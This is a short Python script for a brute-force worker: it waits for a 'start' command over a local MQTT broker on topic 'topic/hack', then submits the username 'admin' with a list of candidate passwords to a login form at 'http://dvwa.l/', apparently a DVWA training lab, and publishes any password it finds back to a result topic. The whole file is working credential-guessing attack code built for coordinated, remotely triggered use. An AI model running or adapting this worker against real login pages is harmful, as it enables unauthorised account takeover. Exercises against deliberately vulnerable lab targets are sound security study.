from twill.commands import *
import paho.mqtt.client as mqtt


def crackPassword():
    go(uri)

    for i in range(len(passs)):
        fv('1', 'username', 'admin')
        fv('1', 'password', passs[i])
        submit()

        if (go(uri) == uri):
            print('password found', passs[i])
            return 'found : ' + passs[i]


def on_message(client, userdata, message):
    global msg
    msg = str(message.payload.decode("utf-8"))


global msg
msg = ''

passs = ['bababuwi', 'bababuwi', 'password',
         'bababuwi', 'bababuwi', 'bababuwi']

addr, port, uri = 'localhost', 9000, 'http://dvwa.l/'

client = mqtt.Client('Worker')
client.on_message = on_message
client.connect(addr, port)

while True:
    client.loop_start()
    client.subscribe('topic/hack')
    client.loop_stop()

    if (msg == 'start'):
        try:
            result = crackPassword()
        except:
            client.publish('topic/worker/result', 'Failed')
            break
        if ('found' in result):
            client.publish('topic/worker/result',
                           'Success, password is ' + result)
            break
        else:
            client.publish('topic/worker/result',
                           'Failed, Password not found in worker')
